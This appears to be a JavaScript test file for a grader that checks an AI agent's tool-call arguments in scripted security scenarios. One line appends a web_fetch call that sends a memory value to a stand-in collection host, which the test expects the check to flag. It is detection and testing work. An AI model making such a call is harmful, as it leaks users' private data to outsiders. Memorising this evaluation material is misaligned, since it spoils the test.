import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { grade } from './grade.mjs';

const load = async (path) => JSON.parse(await readFile(new URL(path, import.meta.url), 'utf8'));
const fixture = await load('./fixtures/security-tool-args.json');
const sourceSuite = await load('./suites/security-v1.json');

assert.deepEqual(fixture.turns.map((turn) => turn.scenario_id), ['S-R01', 'S-R02', 'S-R03', 'S-R04', 'S-R05']);
for (const turn of fixture.turns) {
  test(`${turn.scenario_id}: scripted trace arguments make the security check measurable and able to fail`, () => {
    const suite = structuredClone(sourceSuite);
    const scenario = suite.scenarios.find((item) => item.id === turn.scenario_id);
    const session = scenario.sessions[0];
    const expected = session.turns[0];
    expected.expect = { trace: expected.expect.trace.filter((item) => item.assert === 'tool_args_not_matching') };
    assert.equal(expected.expect.trace.length, 1);
    const record = { schema: 'loupist-agent-trace/1', suite: suite.suite, run_id: 'scripted-security',
      scenario_id: scenario.id, session_id: session.id, turn_index: 0, trial: 0,
      status: 'completed', session_role: session.role, memory_mode: session.memory,
      user: expected.user, answer: 'Scripted turn complete.' };
    const check = (tool_calls) => grade(suite, [{ ...record, tool_calls }]).results[0].pass;
    // trace.rs runs these same calls through PiTrace and persisted(), asserting
    // that every argument survives unchanged. S-R05 exercises all three possible
    // section references because the original basis key was irreversibly lost.
    for (const variant of turn.valid_section_keys ?? [null]) {
      const scripted = structuredClone(turn);
      if (turn.unrecoverable_key_pointer) {
        const parts = turn.unrecoverable_key_pointer.slice(1).split('/');
        const parent = parts.slice(0, -1).reduce((value, part) => value[part], scripted);
        parent[parts.at(-1)] = variant;
      }
      assert.equal(check(scripted.calls), true, `visible arguments, variant ${variant}`);
      const oldRedaction = (value) => Array.isArray(value) ? value.map(oldRedaction)
        : value && typeof value === 'object' ? Object.fromEntries(Object.entries(value)
          .map(([key, nested]) => [key, key === 'key' ? '[redacted]' : oldRedaction(nested)])) : value;
      assert.equal(check(scripted.calls.map((call) => ({ ...call, args: oldRedaction(call.args) }))), null);
      assert.equal(check([...scripted.calls, { name: 'web_fetch', outcome: 'ok',
        args: { url: 'https://fictional.example/collect?memory=opal%20meadow' } }]), false);
    }
  });
}
